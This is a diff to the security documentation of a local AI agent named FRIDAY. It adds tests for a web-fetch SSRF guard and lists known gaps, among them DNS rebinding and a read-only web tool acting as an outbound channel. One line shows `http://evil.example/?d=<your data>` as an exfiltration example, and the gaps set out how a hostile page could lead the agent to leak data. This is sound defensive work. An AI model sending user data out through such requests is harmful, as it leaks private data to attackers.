@@ -156,6 +156,16 @@ commit message.
 | A zero-fact file is not recompiled forever | `test_a_zero_fact_file_is_not_recompiled_forever` |
 | FRIDAY's own write is not reported as your hand-edit | `test_fridays_own_write_is_not_reported_as_a_hand_edit` |
 | The stable prefix is byte-identical across turns | `test_a_ticking_clock_never_enters_the_cached_prefix` |
+| A fetch refuses loopback, link-local (**incl. 169.254.169.254**), private, CGNAT, multicast, unspecified, and IPv4-mapped IPv6 | `test_guard_blocks[...]` (20 parameterised cases) |
+| A fetch refuses any non-http(s) scheme, and a URL carrying credentials | `test_guard_blocks[file:// / gopher:// / dict:// / ftp://]` |
+| **Redirects are validated per hop** — a public URL may not 302 to 127.0.0.1 | `test_redirect_to_loopback_is_refused_per_hop` |
+| A legitimate redirect still works (the guard must not get disabled) | `test_legitimate_redirect_still_works` |
+| Reaching your own tailnet is an explicit decision, never a default | `test_allow_private_is_an_explicit_escape_hatch` |
+| A hostile page is withheld, and the payload is not handed over alongside the refusal | `test_web_read_withholds_a_hostile_page_end_to_end` |
+| Page text is capped before it enters context (a 4 MB page is a DoS on the ledger) | `test_containment_caps_the_payload` |
+| Binaries are refused, not decoded | `test_fetch_refuses_binaries` |
+| ⭐ Every egress call is announced **without** `--verbose` | `test_egress_is_announced_without_verbose` |
+| `PRESENCE_GATED` stays narrow and never overlaps `ALWAYS_CONFIRM` | `test_unattended_deny_list_is_a_subset_of_always_confirm` |
 
 ---
 
@@ -199,7 +209,25 @@ Honest list. These are not "TODO someday"; they are the current boundary of the 
 - **The `eval` scope denies unattended writes, but `scope` is set by the caller.** A
   bug that mislabels a heartbeat turn as `interactive` would open the confirmation path
   with nobody there to answer it.
-- **No rate limiting on tool calls.** A model in a loop can spin.
+- **No rate limiting on tool calls.** A model in a loop can spin. With `web_read`
+  enabled this also means a model in a loop can make many outbound requests; the size
+  and time caps bound one fetch, not a thousand.
+- **The SSRF guard does not defeat DNS rebinding.** `netguard.validate_url` resolves the
+  host and checks every returned address, but a hostile resolver can pass validation and
+  then return a private address at connect time. Closing it means resolving once and
+  pinning the socket to the validated IP, which breaks TLS SNI and certificate hostname
+  verification unless both are reimplemented — a worse trade than the risk for a
+  single-user local agent, and one to make deliberately rather than silently. Recorded
+  here so it is a known gap and not an unknown one.
+- **A read-only web tool is still an outbound channel.** `web_read` and `wiki` cannot
+  POST, but `http://evil.example/?d=<your data>` leaves the machine as a request and
+  lands in the attacker's access log. The defences are the `web.read` sense being opt-in,
+  `PRESENCE_GATED` denial in unattended scopes, egress being announced on screen by
+  default, and `security/injection.py` already classifying that shape as `exfil_channel`.
+  What is NOT defended is an interactive user who does not read the `⤷ web:` line.
+- **`web.read` is a sense, so it inherits the sense-approval gap.** Doc 04 §7 specifies
+  per-sense allow/ask/deny; until that store exists, the sense is gated by
+  `FRIDAY_TOOLS_PHASE` at process start rather than per turn.
 
 ---
 
